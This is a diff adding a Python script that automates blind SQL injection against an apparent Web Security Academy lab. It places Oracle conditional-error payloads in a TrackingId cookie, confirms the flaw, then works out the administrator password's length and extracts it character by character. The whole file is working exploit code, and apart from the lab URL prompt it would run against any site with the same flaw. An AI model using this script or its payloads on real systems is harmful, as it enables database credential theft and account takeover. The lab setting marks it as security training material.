@@ -1,0 +1,85 @@
+import requests
+import string
+
+base_url = input("Enter the base URL of the lab (e.g. https://xxxx.web-security-academy.net): ").rstrip("/")
+session = requests.Session()
+
+print("[*] Fetching home page to obtain a valid TrackingId cookie...")
+home_response = session.get(base_url)
+original_tracking_id = session.cookies.get("TrackingId")
+
+if not original_tracking_id:
+    print("==> Error: No TrackingId cookie was set by the server.")
+    exit()
+
+print(f"[*] Original TrackingId: {original_tracking_id}")
+
+
+def send_condition(sql_condition, from_clause="FROM dual"):
+    """
+    Builds the exact payload structure from the lab walkthrough:
+    xyz'||(SELECT CASE WHEN (<condition>) THEN TO_CHAR(1/0) ELSE '' END <from_clause>)||'
+    Returns True if the response is an HTTP 500 (error = condition was true).
+    """
+    payload = (
+        f"{original_tracking_id}'||(SELECT CASE WHEN ({sql_condition}) "
+        f"THEN TO_CHAR(1/0) ELSE '' END {from_clause})||'"
+    )
+    cookies = {"TrackingId": payload}
+    response = requests.get(base_url, cookies=cookies)
+    return response.status_code == 500
+
+
+# confirm injection is processed as SQL (1=1 should error, 1=2 should not)
+print("[*] Confirming injection point with 1=1 (should error)...")
+check_true = send_condition("1=1")
+print(f"    Result: {'error (500)' if check_true else 'no error (200)'}")
+
+print("[*] Confirming injection point with 1=2 (should NOT error)...")
+check_false = send_condition("1=2")
+print(f"    Result: {'error (500)' if check_false else 'no error (200)'}")
+
+if not (check_true and not check_false):
+    print("==> Error: Injection point not behaving as expected. Check cookie/base URL.")
+    exit()
+print("[+] Injection confirmed as a working Oracle-style conditional error.")
+
+admin_exists = send_condition("1=1", from_clause="FROM users WHERE username='administrator'")
+if not admin_exists:
+    print("==> Error: Could not confirm an 'administrator' user exists.")
+    exit()
+print("[+] Confirmed: 'administrator' user exists.")
+
+print("\n[*] Determining password length...")
+password_length = 0
+for length in range(1, 50):
+    condition = f"LENGTH(password)>{length}"
+    from_clause = "FROM users WHERE username='administrator'"
+    if not send_condition(condition, from_clause):
+        password_length = length
+        break
+    print(f"    Password length is greater than {length}...")
+
+print(f"[+] Password length determined: {password_length} characters")
+print("\n[*] Extracting password, one character at a time...")
+charset = string.ascii_lowercase + string.digits
+found_password = ""
+
+for position in range(1, password_length + 1):
+    found_char = None
+    for char in charset:
+        condition = f"SUBSTR(password,{position},1)='{char}'"
+        from_clause = "FROM users WHERE username='administrator'"
+        if send_condition(condition, from_clause):
+            found_char = char
+            break
+
+    if found_char is None:
+        print(f"    Position {position}: no match found, stopping.")
+        break
+
+    found_password += found_char
+    print(f"    Position {position}: '{found_char}'  (password so far: {found_password})")
+
+print(f"\n[+] Full password extracted: {found_password}")
+print("[*] Go to the login page and log in manually as administrator with this password.")
